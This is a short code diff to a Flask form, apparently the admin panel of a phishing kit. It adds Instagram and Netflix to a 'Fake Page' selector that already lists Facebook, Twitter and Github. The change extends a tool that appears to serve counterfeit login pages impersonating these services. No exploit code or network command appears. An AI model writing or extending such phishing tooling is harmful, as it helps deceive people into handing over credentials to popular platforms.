@@ -5,7 +5,9 @@ class PanelForm(FlaskForm):
     page = SelectField('Fake Page', choices=[
         ('fb', 'Facebook'),
         ('tw', 'Twitter'),
-        ('gh', 'Github')
+        ('gh', 'Github'),
+        ('insta', 'Instagram'),
+        ('nf', 'Netflix')
     ])
     #newpagecode = TextAreaField('New page source code')
     submit = SubmitField('Save') 
